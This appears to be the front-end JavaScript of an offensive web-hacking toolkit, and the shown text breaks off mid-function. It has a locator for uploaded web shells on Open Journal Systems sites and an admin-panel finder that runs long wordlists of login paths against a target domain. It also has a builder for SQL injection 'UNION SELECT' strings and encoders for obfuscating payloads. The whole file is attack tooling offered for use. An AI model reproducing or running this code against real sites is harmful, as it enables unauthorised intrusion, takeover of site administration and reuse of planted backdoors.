(function() {
	'use strict';
	window.addEventListener('load', function() {
		var forms = document.getElementsByClassName('needs-validation');
		var validation = Array.prototype.filter.call(forms, function(form) {
			form.addEventListener('submit', function(event) {
				if (form.checkValidity() === false) {
					event.preventDefault();
					event.stopPropagation();
				}
				form.classList.add('was-validated');
			},
				false);
		});
	}, false);
})();


$('.owl-auto-play').owlCarousel({
  items:2,
  loop:true,
  margin:10,
  autoplay:true,
  autoplayTimeout:1000,
  responsive:{
    0:{
        items:2
    },
    600:{
        items:3
    },
    1000:{
        items:4
    }
	}
});



function ojsFinder() {
	var site = $('#site').val().trim();
	var shell = $('#shell').val().trim();
	var split = shell.split('-');
	var id = split[0];
	if (site == '' || shell == '') {
		Swal.fire({
      position: 'top-end',
      icon: 'error',
      title: 'Fields can&apos;t be empty!',
      showConfirmButton: false,
      timer: 1500
    });
    return false;
	}
	$('#res').fadeIn(200);
	findShell(site, shell, id, 0);
}

function findShell(site, shell, id, number) {
	if (number >= 1000) {
		return false;
	}
	$.ajax({
		url: '/public/api/ojs',
		data: {
			site: site,
			shell: shell,
			id: id,
			num: number,
		},
		type: 'POST',
		dataType: 'json',
		success: function(data) {
			switch (data.status) {
				case 0:
					$('#result').append(data.msg+'<br>')
					break;
				case 1:
					$('#result').append(data.msg+'<br>')
					break;
			}
			number++;
			findShell(site, shell, id, number);
		}
	});
}

function adminFinder() {
	var url = $('#domain').val().trim();
	var type = $('#type').val().trim();
	if (url == '') {
		Swal.fire({
      position: 'top-end',
      icon: 'error',
      title: 'Domain can&apos;t be empty!',
      showConfirmButton: false,
      timer: 1500
    });
    return false;
	}
	$('#res').fadeIn(200);
	switch (type) {
		case 'php':
			s_php(url)
			break;
		case 'html':
			s_html(url)
			break;
		case 'asp':
			s_asp(url)
			break;
		case 'default':
			s_default(url)
			break;
	}
}

function scanUrl(url, list, curlist) {
	if (curlist >= list.length) {
		return false;
	}
	$.ajax({
		url: '/public/api/adminfinder',
		data: {
			url: url,
			list: list[curlist]
		},
		type: 'POST',
		dataType: 'json',
		success: function(data) {
			switch (data.status) {
				case 0:
					$('#result').append(data.msg+'<br>')
					break;
				case 1:
					$('#result').append(data.msg+'<br>')
					break;
					
			}
			curlist++;
			scanUrl(url, list, curlist)
		}
	});
}

function s_php(url) {
	var list = [
		'/admin/home.php/',
		'/admin/controlpanel.php/',
		'/admin/cp.php/',
		'/admin/adminLogin.php/',
		'/admin/admin_login.php/',
		'/admin/controlpanel.php/',
		'/admin/admin-login.php/',
		'/admin-login.php/',
		'/admin/account.php/',
		'/admin/admin.php/',
		'/admin/',
		'/admin.php/',
		'/adminitem.php/',
		'/adminitems.php/',
		'/administrator/login.php/',
		'/administrator.php/',
		'/administration.php/',
		'/adminlogin.php/',
		'/admin_area/admin.php/',
		'/admin_area/login.php/',
		'/manager.php/',
		'/letmein.php/',
		'/superuser.php/',
		'/access.php/',
		'/sysadm.php/',
		'/panel.php/',
		'/control.php/',
		'/member.php/',
		'/members.php/',
		'/user.php/',
		'/manage.php/',
		'/management.php/',
		'/signin.php/',
		'/log-in.php/',
		'/log_in.php/',
		'/sign_in.php/',
		'/sign-in.php/',
		'/users.php/',
		'/accounts.php/',
		'/wp-login.php/',
		'/bb-admin/login.php/',
		'/bb-admin/admin.php/',
		'/bb-admin/admin.php/',
		'/administrator/account.php/',
		'/relogin.php/',
		'/relogin.php/',
		'/check.php/',
		'/relogin.php/',
		'/blog/wp-login.php/',
		'/user/admin.php/',
		'/users/admin.php/',
		'/processlogin.php/',
		'/checklogin.php/',
		'/checkuser.php/',
		'/checkadmin.php/',
		'/isadmin.php/',
		'/authenticate.php/',
		'/authentication.php/',
		'/auth.php/',
		'/authuser.php/',
		'/authadmin.php/',
		'/cp.php/',
		'/modelsearch/login.php/',
		'/moderator.php/',
		'/controlpanel.php/',
		'/admincontrol.php/',
		'/adminpanel.php/',
		'/fileadmin.php/',
		'/sysadmin.php/',
		'/admin1.php/',
		'/admin2.php/',
		'/yonetim.php/',
		'/yonetici.php/',
		'/ur-admin.php/',
		'/Server.php/',
		'/administr8.php/',
		'/webadmin.php/',
		'/admins.php/',
		'/adm.php/',
		'/admin_login.php/',
		'/panel-administracion/login.php/',
		'/pages/admin/admin-login.php/',
		'/acceso.php/',
		'/admincp/login.php/',
		'/affiliate.php/',
		'/adm_auth.php/',
		'/memberadmin.php/',
		'/administratorlogin.php/',
		'/administrators.php/',
		'/siteadmin.php/',
		'/vorod.php/',
		'/vorud.php/',
		'/webmaster.php/',
		'/autologin.php/',
		'/userlogin.php/',
		'/admin_area.php/',
		'/cmsadmin.php/',
		'/admin/login.php/',
		'/admin/adminLogin.php/',
		'/moderator.php/',
		'/moderator.php/',
		'/moderator/login.php/',
		'/moderator/admin.php/',
		'/yonetici.php/',
		'/cgi-bin/login.php/',
		'/login1.php/',
		'/login_admin.php/',
		'/login_out/',
		'/login_out.php/',
		'/login_user.php/',
		'/loginsuper.php/',
		'/logout.php/',
		'/super1.php/',
		'/super_index.php/',
		'/super_login.php/',
		'/supermanager.php/',
		'/superman.php/',
		'/superuser.php/',
		'/supervise/Login.php/',
		'/super.php/',
		'/login.php/',
		'/admin.php/',
		'/login.php/',
		'/login.php/',
		'/login.php/',
		'/admin/account.php/',
		'/admin/login.php/',
		'/admin/login.php/',
		'/admin/home.php/',
		'/admin/controlpanel.php/',
		'/admin/controlpanel.php/',
		'/admin/cp.php/',
		'/admin/adminLogin.php/',
		'/admin/adminLogin.php/',
		'/admin/admin_login.php/',
		'/admin/controlpanel.php/',
		'/admin/admin-login.php/',
		'/admin-login.php/',
		'/admin/account.php/',
		'/admin/admin.php/',
		'/admin.php/',
		'/admin.php/',
		'/adminitem.php/',
		'/adminitems.php/',
		'/administrator/login.php/',
		'/administrator.php/',
		'/administration.php/',
		'/adminlogin.php/',
		'/admin_area/admin.php/',
		'/admin_area/login.php/',
		'/manager.php/',
		'/letmein.php/',
		'/superuser.php/',
		'/access.php/',
		'/sysadm.php/',
		'/panel.php/',
		'/control.php/',
		'/member.php/',
		'/members.php/',
		'/user.php/',
		'/manage.php/',
		'/management.php/',
		'/signin.php/',
		'/log-in.php/',
		'/log_in.php/',
		'/sign_in.php/',
		'/sign-in.php/',
		'/users.php/',
		'/accounts.php/',
		'/wp-login.php/',
		'/bb-admin/login.php/',
		'/bb-admin/admin.php/',
		'/bb-admin/admin.php/',
		'/administrator/account.php/',
		'/relogin.php/',
		'/relogin.php/',
		'/check.php/',
		'/relogin.php/',
		'/blog/wp-login.php/',
		'/user/admin.php/',
		'/users/admin.php/',
		'/processlogin.php/',
		'/checklogin.php/',
		'/checkuser.php/',
		'/checkadmin.php/',
		'/isadmin.php/',
		'/authenticate.php/',
		'/authentication.php/',
		'/auth.php/',
		'/authuser.php/',
		'/authadmin.php/',
		'/modelsearch/login.php/',
		'/moderator.php/',
		'/controlpanel.php/',
		'/admincontrol.php/',
		'/adminpanel.php/',
		'/fileadmin.php/',
		'/sysadmin.php/',
		'/admin1.php/',
		'/admin1.php/',
		'/admin1.php/',
		'/admin2.php/',
		'/admin2.php/',
		'/yonetim.php/',
		'/yonetim.php/',
		'/yonetici.php/',
		'/yonetici.php/',
		'/ur-admin.php/',
		'/Server.php/',
		'/wp-admin/',
		'/administr8.php/',
		'/webadmin.php/',
		'/admins.php/',
		'/admin_login.php/',
		'/panel-administracion/login.php/',
		'/pages/admin/admin-login.php/',
		'/acceso.php/',
		'/admincp/login.php/',
		'/affiliate.php/',
		'/adm_auth.php/',
		'/memberadmin.php/',
		'/administratorlogin.php/',
		'/administrators.php/',
		'/siteadmin.php/',
		'/vorod.php/',
		'/vorud.php/',
		'/webmaster.php/',
		'/autologin.php/',
		'/userlogin.php/',
		'/admin_area.php/',
		'/cmsadmin.php/',
		'/admin/login.php/',
		'/admin/adminLogin.php/',
		'/moderator.php/',
		'/moderator.php/',
		'/moderator/login.php/',
		'/moderator/admin.php/',
		'/yonetici.php/',
		'/cgi-bin/login.php/',
		'/login1.php/',
		'/login_admin.php/',
		'/login_out.php/',
		'/login_user.php/',
		'/loginsuper.php/',
		'/logout.php/',
		'/super1.php/',
		'/super_index.php/',
		'/super_login.php/',
		'/supermanager.php/',
		'/superman.php/',
		'/superuser.php/',
		'/supervise/Login.php/',
		'/super.php/',
		'/adm.php/'
	];
	scanUrl(url, list, 0)
}

function s_html(url) {
	var list = [
		'/admin/home.html/',
		'/admin/controlpanel.htm/',
		'/admin/cp.html/',
		'/admin/adminLogin.htm/',
		'/admin/admin_login.html/',
		'/admin/controlpanel.html/',
		'/admin/admin-login.html/',
		'/admin-login.html/',
		'/admin/account.html/',
		'/admin/admin.html/',
		'/admin.htm/',
		'/admin.html/',
		'/adminitem.html/',
		'/adminitems.html/',
		'/administrator/login.html/',
		'/administrator.html/',
		'/administration.html/',
		'/adminlogin.html/',
		'/admin_area/admin.html/',
		'/admin_area/login.html/',
		'/manager.html/',
		'/letmein.html/',
		'/superuser.html/',
		'/access.html/',
		'/sysadm.html/',
		'/panel.html/',
		'/control.html/',
		'/member.html/',
		'/members.html/',
		'/user.html/',
		'/manage.html/',
		'/management.html/',
		'/signin.html/',
		'/log-in.html/',
		'/log_in.html/',
		'/sign_in.html/',
		'/sign-in.html/',
		'/users.html/',
		'/accounts.html/',
		'/wp-login.html/',
		'/bb-admin/login.html/',
		'/bb-admin/admin.html/',
		'/bb-admin/admin.html/',
		'/administrator/account.html/',
		'/relogin.htm/',
		'/relogin.html/',
		'/check.html/',
		'/relogin.html/',
		'/blog/wp-login.html/',
		'/user/admin.html/',
		'/users/admin.html/',
		'/processlogin.html/',
		'/checklogin.html/',
		'/checkuser.html/',
		'/checkadmin.html/',
		'/isadmin.html/',
		'/authenticate.html/',
		'/authentication.html/',
		'/auth.html/',
		'/authuser.html/',
		'/authadmin.html/',
		'/cp.html/',
		'/modelsearch/login.html/',
		'/moderator.html/',
		'/controlpanel.html/',
		'/admincontrol.html/',
		'/adminpanel.html/',
		'/fileadmin.html/',
		'/sysadmin.html/',
		'/admin1.html/',
		'/admin2.html/',
		'/yonetim.html/',
		'/yonetici.html/',
		'/ur-admin.html/',
		'/Server.html/',
		'/administr8.html/',
		'/webadmin.html/',
		'/admins.html/',
		'/adm.html/',
		'/admin_login.html/',
		'/panel-administracion/login.html/',
		'/pages/admin/admin-login.html/',
		'/acceso.html/',
		'/admincp/login.html/',
		'/affiliate.html/',
		'/adm_auth.html/',
		'/memberadmin.html/',
		'/administratorlogin.html/',
		'/administrators.html/',
		'/siteadmin.html/',
		'/vorod.html/',
		'/vorud.html/',
		'/webmaster.html/',
		'/autologin.html/',
		'/userlogin.html/',
		'/admin_area.html/',
		'/cmsadmin.html/',
		'/admin/login.html/',
		'/admin/adminLogin.html/',
		'/moderator.html/',
		'/moderator.html/',
		'/moderator/login.html/',
		'/moderator/admin.html/',
		'/yonetici.html/',
		'/cgi-bin/login.html/',
		'/login1.html/',
		'/login_admin.html/',
		'/login_out/',
		'/login_out.html/',
		'/login_user.html/',
		'/loginsuper.html/',
		'/logout.html/',
		'/super1.html/',
		'/super_index.html/',
		'/super_login.html/',
		'/supermanager.html/',
		'/superman.html/',
		'/superuser.html/',
		'/supervise/Login.html/',
		'/super.html/',
		'/login.htm/',
		'/admin.html/',
		'/login.htm/',
		'/login.html/',
		'/login.html/',
		'/admin/account.html/',
		'/admin/login.html/',
		'/admin/login.htm/',
		'/admin/home.html/',
		'/admin/controlpanel.html/',
		'/admin/controlpanel.htm/',
		'/admin/cp.html/',
		'/admin/adminLogin.html/',
		'/admin/adminLogin.htm/',
		'/admin/admin_login.html/',
		'/admin/controlpanel.html/',
		'/admin/admin-login.html/',
		'/admin-login.html/',
		'/admin/account.html/',
		'/admin/admin.html/',
		'/admin.htm/',
		'/admin.html/',
		'/adminitem.html/',
		'/adminitems.html/',
		'/administrator/login.html/',
		'/administrator.html/',
		'/administration.html/',
		'/adminlogin.html/',
		'/admin_area/admin.html/',
		'/admin_area/login.html/',
		'/manager.html/',
		'/letmein.html/',
		'/superuser.html/',
		'/access.html/',
		'/sysadm.html/',
		'/panel.html/',
		'/control.html/',
		'/member.html/',
		'/members.html/',
		'/user.html/',
		'/manage.html/',
		'/management.html/',
		'/signin.html/',
		'/log-in.html/',
		'/log_in.html/',
		'/sign_in.html/',
		'/sign-in.html/',
		'/users.html/',
		'/accounts.html/',
		'/wp-login.html/',
		'/bb-admin/login.html/',
		'/bb-admin/admin.html/',
		'/bb-admin/admin.html/',
		'/administrator/account.html/',
		'/relogin.htm/',
		'/relogin.html/',
		'/check.html/',
		'/relogin.html/',
		'/blog/wp-login.html/',
		'/user/admin.html/',
		'/users/admin.html/',
		'/processlogin.html/',
		'/checklogin.html/',
		'/checkuser.html/',
		'/checkadmin.html/',
		'/isadmin.html/',
		'/authenticate.html/',
		'/authentication.html/',
		'/auth.html/',
		'/authuser.html/',
		'/authadmin.html/',
		'/modelsearch/login.html/',
		'/moderator.html/',
		'/controlpanel.html/',
		'/admincontrol.html/',
		'/adminpanel.html/',
		'/fileadmin.html/',
		'/sysadmin.html/',
		'/admin1.html/',
		'/admin1.html/',
		'/admin1.htm/',
		'/admin2.html/',
		'/admin2.html/',
		'/yonetim.html/',
		'/yonetim.html/',
		'/yonetici.html/',
		'/yonetici.html/',
		'/ur-admin.html/',
		'/Server.html/',
		'/wp-admin/',
		'/administr8.html/',
		'/webadmin.html/',
		'/admins.html/',
		'/admin_login.html/',
		'/panel-administracion/login.html/',
		'/pages/admin/admin-login.html/',
		'/acceso.html/',
		'/admincp/login.html/',
		'/affiliate.html/',
		'/adm_auth.html/',
		'/memberadmin.html/',
		'/administratorlogin.html/',
		'/administrators.html/',
		'/siteadmin.html/',
		'/vorod.html/',
		'/vorud.html/',
		'/webmaster.html/',
		'/autologin.html/',
		'/userlogin.html/',
		'/admin_area.html/',
		'/cmsadmin.html/',
		'/admin/login.html/',
		'/admin/adminLogin.html/',
		'/moderator.html/',
		'/moderator.html/',
		'/moderator/login.html/',
		'/moderator/admin.html/',
		'/yonetici.html/',
		'/cgi-bin/login.html/',
		'/login1.html/',
		'/login_admin.html/',
		'/login_out.html/',
		'/login_user.html/',
		'/loginsuper.html/',
		'/logout.html/',
		'/super1.html/',
		'/super_index.html/',
		'/super_login.html/',
		'/supermanager.html/',
		'/superman.html/',
		'/superuser.html/',
		'/supervise/Login.html/',
		'/super.html/',
		'/adm.html/'
	];
	scanUrl(url, list, 0)
}

function s_asp(url) {
	var list = [
		'/admin/home.asp/',
		'/admin/controlpanel.asp/',
		'/admin/cp.asp/',
		'/admin/adminLogin.asp/',
		'/admin/admin_login.asp/',
		'/admin/controlpanel.asp/',
		'/admin/admin-login.asp/',
		'/admin-login.asp/',
		'/admin/account.asp/',
		'/admin/admin.asp/',
		'/admin.asp/',
		'/admin.asp/',
		'/adminitem.asp/',
		'/adminitems.asp/',
		'/administrator/login.asp/',
		'/administrator.asp/',
		'/administration.asp/',
		'/adminlogin.asp/',
		'/admin_area/admin.asp/',
		'/admin_area/login.asp/',
		'/manager.asp/',
		'/letmein.asp/',
		'/superuser.asp/',
		'/access.asp/',
		'/sysadm.asp/',
		'/panel.asp/',
		'/control.asp/',
		'/member.asp/',
		'/members.asp/',
		'/user.asp/',
		'/manage.asp/',
		'/management.asp/',
		'/signin.asp/',
		'/log-in.asp/',
		'/log_in.asp/',
		'/sign_in.asp/',
		'/sign-in.asp/',
		'/users.asp/',
		'/accounts.asp/',
		'/wp-login.asp/',
		'/bb-admin/login.asp/',
		'/bb-admin/admin.asp/',
		'/bb-admin/admin.asp/',
		'/administrator/account.asp/',
		'/relogin.asp/',
		'/relogin.asp/',
		'/check.asp/',
		'/relogin.asp/',
		'/blog/wp-login.asp/',
		'/user/admin.asp/',
		'/users/admin.asp/',
		'/processlogin.asp/',
		'/checklogin.asp/',
		'/checkuser.asp/',
		'/checkadmin.asp/',
		'/isadmin.asp/',
		'/authenticate.asp/',
		'/authentication.asp/',
		'/auth.asp/',
		'/authuser.asp/',
		'/authadmin.asp/',
		'/cp.asp/',
		'/modelsearch/login.asp/',
		'/moderator.asp/',
		'/controlpanel.asp/',
		'/admincontrol.asp/',
		'/adminpanel.asp/',
		'/fileadmin.asp/',
		'/sysadmin.asp/',
		'/admin1.asp/',
		'/admin2.asp/',
		'/yonetim.asp/',
		'/yonetici.asp/',
		'/ur-admin.asp/',
		'/Server.asp/',
		'/administr8.asp/',
		'/webadmin.asp/',
		'/admins.asp/',
		'/adm.asp/',
		'/admin_login.asp/',
		'/panel-administracion/login.asp/',
		'/pages/admin/admin-login.asp/',
		'/acceso.asp/',
		'/admincp/login.asp/',
		'/affiliate.asp/',
		'/adm_auth.asp/',
		'/memberadmin.asp/',
		'/administratorlogin.asp/',
		'/administrators.asp/',
		'/siteadmin.asp/',
		'/vorod.asp/',
		'/vorud.asp/',
		'/webmaster.asp/',
		'/autologin.asp/',
		'/userlogin.asp/',
		'/admin_area.asp/',
		'/cmsadmin.asp/',
		'/admin/login.asp/',
		'/admin/adminLogin.asp/',
		'/moderator.asp/',
		'/moderator.asp/',
		'/moderator/login.asp/',
		'/moderator/admin.asp/',
		'/yonetici.asp/',
		'/cgi-bin/login.asp/',
		'/login1.asp/',
		'/login_admin.asp/',
		'/login_out/',
		'/login_out.asp/',
		'/login_user.asp/',
		'/loginsuper.asp/',
		'/logout.asp/',
		'/super1.asp/',
		'/super_index.asp/',
		'/super_login.asp/',
		'/supermanager.asp/',
		'/superman.asp/',
		'/superuser.asp/',
		'/supervise/Login.asp/',
		'/super.asp/',
		'/login.asp/',
		'/admin.asp/',
		'/login.asp/',
		'/login.asp/',
		'/login.asp/',
		'/admin/account.asp/',
		'/admin/login.asp/',
		'/admin/login.asp/',
		'/admin/home.asp/',
		'/admin/controlpanel.asp/',
		'/admin/controlpanel.asp/',
		'/admin/cp.asp/',
		'/admin/adminLogin.asp/',
		'/admin/adminLogin.asp/',
		'/admin/admin_login.asp/',
		'/admin/controlpanel.asp/',
		'/admin/admin-login.asp/',
		'/admin-login.asp/',
		'/admin/account.asp/',
		'/admin/admin.asp/',
		'/admin.asp/',
		'/admin.asp/',
		'/adminitem.asp/',
		'/adminitems.asp/',
		'/administrator/login.asp/',
		'/administrator.asp/',
		'/administration.asp/',
		'/adminlogin.asp/',
		'/admin_area/admin.asp/',
		'/admin_area/login.asp/',
		'/manager.asp/',
		'/letmein.asp/',
		'/superuser.asp/',
		'/access.asp/',
		'/sysadm.asp/',
		'/panel.asp/',
		'/control.asp/',
		'/member.asp/',
		'/members.asp/',
		'/user.asp/',
		'/manage.asp/',
		'/management.asp/',
		'/signin.asp/',
		'/log-in.asp/',
		'/log_in.asp/',
		'/sign_in.asp/',
		'/sign-in.asp/',
		'/users.asp/',
		'/accounts.asp/',
		'/wp-login.asp/',
		'/bb-admin/login.asp/',
		'/bb-admin/admin.asp/',
		'/bb-admin/admin.asp/',
		'/administrator/account.asp/',
		'/relogin.asp/',
		'/relogin.asp/',
		'/check.asp/',
		'/relogin.asp/',
		'/blog/wp-login.asp/',
		'/user/admin.asp/',
		'/users/admin.asp/',
		'/processlogin.asp/',
		'/checklogin.asp/',
		'/checkuser.asp/',
		'/checkadmin.asp/',
		'/isadmin.asp/',
		'/authenticate.asp/',
		'/authentication.asp/',
		'/auth.asp/',
		'/authuser.asp/',
		'/authadmin.asp/',
		'/modelsearch/login.asp/',
		'/moderator.asp/',
		'/controlpanel.asp/',
		'/admincontrol.asp/',
		'/adminpanel.asp/',
		'/fileadmin.asp/',
		'/sysadmin.asp/',
		'/admin1.asp/',
		'/admin1.asp/',
		'/admin1.asp/',
		'/admin2.asp/',
		'/admin2.asp/',
		'/yonetim.asp/',
		'/yonetim.asp/',
		'/yonetici.asp/',
		'/yonetici.asp/',
		'/ur-admin.asp/',
		'/Server.asp/',
		'/wp-admin/',
		'/administr8.asp/',
		'/webadmin.asp/',
		'/admins.asp/',
		'/admin_login.asp/',
		'/panel-administracion/login.asp/',
		'/pages/admin/admin-login.asp/',
		'/acceso.asp/',
		'/admincp/login.asp/',
		'/affiliate.asp/',
		'/adm_auth.asp/',
		'/memberadmin.asp/',
		'/administratorlogin.asp/',
		'/administrators.asp/',
		'/siteadmin.asp/',
		'/vorod.asp/',
		'/vorud.asp/',
		'/webmaster.asp/',
		'/autologin.asp/',
		'/userlogin.asp/',
		'/admin_area.asp/',
		'/cmsadmin.asp/',
		'/admin/login.asp/',
		'/admin/adminLogin.asp/',
		'/moderator.asp/',
		'/moderator.asp/',
		'/moderator/login.asp/',
		'/moderator/admin.asp/',
		'/yonetici.asp/',
		'/cgi-bin/login.asp/',
		'/login1.asp/',
		'/login_admin.asp/',
		'/login_out.asp/',
		'/login_user.asp/',
		'/loginsuper.asp/',
		'/logout.asp/',
		'/super1.asp/',
		'/super_index.asp/',
		'/super_login.asp/',
		'/supermanager.asp/',
		'/superman.asp/',
		'/superuser.asp/',
		'/supervise/Login.asp/',
		'/super.asp/',
		'/adm.asp/'

	];
	scanUrl(url, list, 0)
}

function s_default(url) {
	var list = [
		'/adminitems/',
		'/administrator/',
		'/adminLogin/',
		'/admin_area/',
		'/manager/',
		'/letmein/',
		'/superuser/',
		'/access/',
		'/sysadm/',
		'/superman/',
		'/supervisor/',
		'/control/',
		'/member/',
		'/user/',
		'/cp/',
		'/uvpanel/',
		'/manage/',
		'/management/',
		'/signin/',
		'/log-in/',
		'/log_in/',
		'/sign_in/',
		'/sign-in/',
		'/users/',
		'/accounts/',
		'/registration/',
		'/moderator/',
		'/controlpanel/',
		'/fileadmin/',
		'/myadmin/',
		'/ur-admin/',
		'/Server/',
		'/wp-admin/',
		'/administr8/',
		'/webadmin/',
		'/administratie/',
		'/admins/',
		'/administrivia/',
		'/Database_Administration/',
		'/useradmin/',
		'/sysadmins/',
		'/admin1/',
		'/system-administration/',
		'/administrators/',
		'/pgadmin/',
		'/directadmin/',
		'/staradmin/',
		'/ServerAdministrator/',
		'/SysAdmin/',
		'/administer/',
		'/LiveUser_Admin/',
		'/sys-admin/',
		'/typo3/',
		'/panel/',
		'/cpanel/',
		'/cpanel_file/',
		'/platz_login/',
		'/rcLogin/',
		'/blogindex/',
		'/formslogin/',
		'/autologin/',
		'/support_login/',
		'/meta_login/',
		'/manuallogin/',
		'/simpleLogin/',
		'/loginflat/',
		'/utility_login/',
		'/showlogin/',
		'/memlogin/',
		'/login-redirect/',
		'/sub-login/',
		'/wp-login/',
		'/login1/',
		'/dir-login/',
		'/login_db/',
		'/xlogin/',
		'/smblogin/',
		'/customer_login/',
		'/UserLogin/',
		'/login-us/',
		'/acct_login/',
		'/bigadmin/',
		'/admin.%EXT%/',
		'/login.htm/',
		'/login.html/',
		'/login/',
		'/login.%EXT%/',
		'/adm/',
		'/admin/',
		'/admin/account.html/',
		'/admin/login.html/',
		'/admin/login.htm/',
		'/admin/home.%EXT%/',
		'/admin/controlpanel.html/',
		'/admin/controlpanel.htm/',
		'/admin/cp.%EXT%/',
		'/admin/adminLogin.html/',
		'/admin/adminLogin.htm/',
		'/admin/admin_login.%EXT%/',
		'/admin/controlpanel.%EXT%/',
		'/admin/admin-login.%EXT%/',
		'/admin-login.%EXT%/',
		'/admin/account.%EXT%/',
		'/admin/admin.%EXT%/',
		'/admin.htm/',
		'/admin.html/',
		'/adminitem/',
		'/adminitem.%EXT%/',
		'/adminitems/',
		'/adminitems.%EXT%/',
		'/administrator/',
		'/administrator/login.%EXT%/',
		'/administrator.%EXT%/',
		'/administration/',
		'/administration.%EXT%/',
		'/adminLogin/',
		'/adminlogin.%EXT%/',
		'/admin_area/admin.%EXT%/',
		'/admin_area/',
		'/admin_area/login.%EXT%/',
		'/manager/',
		'/manager.%EXT%/',
		'/letmein/',
		'/letmein.%EXT%/',
		'/superuser/',
		'/superuser.%EXT%/',
		'/access/',
		'/access.%EXT%/',
		'/sysadm/',
		'/sysadm.%EXT%/',
		'/superman/',
		'/supervisor/',
		'/panel.%EXT%/',
		'/control/',
		'/control.%EXT%/',
		'/member/',
		'/member.%EXT%/',
		'/members/',
		'/members.%EXT%/',
		'/user/',
		'/user.%EXT%/',
		'/cp/',
		'/uvpanel/',
		'/manage/',
		'/manage.%EXT%/',
		'/management/',
		'/management.%EXT%/',
		'/signin/',
		'/signin.%EXT%/',
		'/log-in/',
		'/log-in.%EXT%/',
		'/log_in/',
		'/log_in.%EXT%/',
		'/sign_in/',
		'/sign_in.%EXT%/',
		'/sign-in/',
		'/sign-in.%EXT%/',
		'/users/',
		'/users.%EXT%/',
		'/accounts/',
		'/accounts.%EXT%/',
		'/wp-login.php/',
		'/bb-admin/login.%EXT%/',
		'/bb-admin/admin.%EXT%/',
		'/bb-admin/admin.html/',
		'/administrator/account.%EXT%/',
		'/relogin.htm/',
		'/relogin.html/',
		'/check.%EXT%/',
		'/relogin.%EXT%/',
		'/blog/wp-login.%EXT%/',
		'/user/admin.%EXT%/',
		'/users/admin.%EXT%/',
		'/registration/',
		'/processlogin.%EXT%/',

	];
	scanUrl(url, list, 0)
}


function runCharCodeAt() {
	input = document.charCodeAt.input.value;
	output = "";
	for (i = 0; i < input.length; ++i) {
		if (output != "") output += ", ";
		output += input.charCodeAt(i);
	}
	document.charCodeAt.output.value = output;
}

function memek() {
	var input = $('#resources').val();
	var output = "";
	for (i = 0; i < input.length; ++i) {
		if (output != "") output += ", ";
		output += input.charCodeAt(i);
	}
	$('.output').val(output)
}


function copy() {

	document.getElementById("hex").select();
	document.execCommand("copy");
	Swal.fire({
		icon: 'success',
		title: 'Text Berhasil di Copy',
		showConfirmButton: false,
		timer: 1000
	});
}
function copy2() {

	document.getElementById("dios").select();
	document.execCommand("copy");
	Swal.fire({
		icon: 'success',
		title: 'Copied!',
		showConfirmButton: false,
		timer: 1000
	});
}


function kolom() {

	var columns = prompt("Total Columns ?", "48");
	columns = Math.min(1000, parseInt(columns));
	var colArray = new Array();
	for (var i = 0; i < columns; i++) {

		colArray.push(i+1);
	}
	var kolom = "+UNION+SELECT+" + colArray.join(','); document.getElementById('dios').value = kolom;
}

function rplc() {
	function replaceAll(str, find, replace) {
		return str.replace(new RegExp(find, 'g'), replace);
	}

	var str = document.getElementById('str').value;
	var wrd = document.getElementById('wrd').value;
	var rep = document.getElementById('rep').value;

	hasil = replaceAll(str, wrd, rep);
	document.getElementById('hex').value = hasil;
}


var encN = 1;
function decodeTxt(s) {
	var s1 = unescape(s.substr(0, s.length-1));
	var t = '';
	for (i = 0; i < s1.length; i++)t += String.fromCharCode(s1.charCodeAt(i)-s.substr(s.length-1, 1));
	return unescape(t);
}


function encodeTxt(s) {
	s = escape(s);
	var ta = new Array();
	for (i = 0; i < s.length; i++)ta[i] = s.charCodeAt(i)+encN;
	return ""+escape(eval("String.fromCharCode("+ta+")"))+encN;
}

function escapeTxt(os) {
	var ns = '';
	var t;
	var chr = '';
	var cc = '';
	var tn = '';
	for (i = 0; i < 256; i++) {
		tn = i.toString(16);
		if (tn.length < 2)tn = "0"+tn;
		cc += tn;
		chr += unescape('%'+tn);
	}

	cc = cc.toUpperCase();
	os.replace(String.fromCharCode(13)+'', "");
	for (q = 0; q < os.length; q++) {
		t = os.substr(q, 1);

		for (i = 0; i < chr.length; i++) {
			if (t == chr.substr(i, 1)) {
				t = t.replace(chr.substr(i, 1), "%"+cc.substr(i*2, 2));
				i = chr.length;
			}
		}
		ns += t;
	}
	return ns;
}

function unescapeTxt(s) {

	return unescape(s);
}
function wF(s) {

	document.write(decodeTxt(s));
}

function esc() {
	var str = document.getElementById('str').value;
	hasil = escapeTxt(str);
	document.getElementById('hex').value = hasil;
}


function unesc() {
	var str = document.getElementById('str').value;
	hasil = unescapeTxt(str);
	document.getElementById('hex').value = hasil;
}

var base64EncodeChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
var base64DecodeChars = new Array(
	-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
	-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
	-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63,
	52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1,
	-1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
	15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1,
	-1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
	41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

function base64encode(str) {
	var out,
	i,
	len;
	var c1,
	c2,
	c3;

	len = str.length;
	i = 0;
	out = "";
	while (i < len) {
		c1 = str.charCodeAt(i++) & 0xff;
		if (i == len) {
			out += base64EncodeChars.charAt(c1 >> 2);
			out += base64EncodeChars.charAt((c1 & 0x3) << 4);
			out += "==";
			break;
		}
		c2 = str.charCodeAt(i++);
		if (i == len) {
			out += base64EncodeChars.charAt(c1 >> 2);
			out += base64EncodeChars.charAt(((c1 & 0x3)<< 4) | ((c2 & 0xF0) >> 4));
			out += base64EncodeChars.charAt((c2 & 0xF) << 2);
			out += "=";
			break;
		}
		c3 = str.charCodeAt(i++);
		out += base64EncodeChars.charAt(c1 >> 2);
		out += base64EncodeChars.charAt(((c1 & 0x3)<< 4) | ((c2 & 0xF0) >> 4));
		out += base64EncodeChars.charAt(((c2 & 0xF) << 2) | ((c3 & 0xC0) >>6));
		out += base64EncodeChars.charAt(c3 & 0x3F);
	}
	return out;
}

function base64decode(str) {
	var c1,
	c2,
	c3,
	c4;
	var i,
	len,
